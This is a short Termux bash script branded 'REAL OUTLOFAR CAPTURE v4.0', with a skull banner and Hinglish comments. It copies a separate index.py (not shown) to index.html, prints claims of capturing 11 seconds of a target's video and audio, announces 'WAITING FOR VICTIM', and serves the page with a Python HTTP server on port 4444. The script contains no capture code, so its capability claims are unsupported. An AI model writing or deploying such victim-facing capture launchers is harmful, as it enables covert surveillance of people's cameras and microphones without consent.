#!/data/data/com.termux/files/usr/bin/bash

# Purana kachra saaf
clear

# VIP Blue Skull Design
echo -e "\e[1;34m"
echo "      .XXXXXXXXXXXXXXX."
echo "     XXXXXXXXXXXXXXXXXXX"
echo "    XXXXXXXXXXXXXXXXXXXXX"
echo "    XXX   XXXXX   XXXXXXX"
echo "    XXX   XXXXX   XXXXXXX"
echo "    XXXXX       XXXXXXXXX"
echo "     XXXXXXXXXXXXXXXXXXX"
echo "      XXXXX  X  XXXXXXX"
echo "       XXXXXXXXXXXXXXX"
echo -e "\e[0m"

echo -e "\e[1;36m[ REAL OUTLOFAR CAPTURE v4.0 ]\e[0m"
echo "-------------------------------------------------------"

# File Fix: index.py ko index.html mein convert karna
echo -e "\e[1;33m[*] System Repairing Paths...\e[0m"
cp ~/Photo/index.py ./index.html 2>/dev/null || cp ~/termux-ngrok/index.py ./index.html 2>/dev/null
sleep 2

# Status Check
echo -e "\e[1;32m[*] SERVER LIVE ON PORT: 4444\e[0m"
echo -e "\e[1;32m[*] CAPTURE READY: 11s VIDEO & AUDIO\e[0m"
echo "-------------------------------------------------------"
echo -e "\e[1;31m[!] WAITING FOR VICTIM... (DO NOT CLOSE)\e[0m"

# Python Server Start
python3 -m http.server 4444
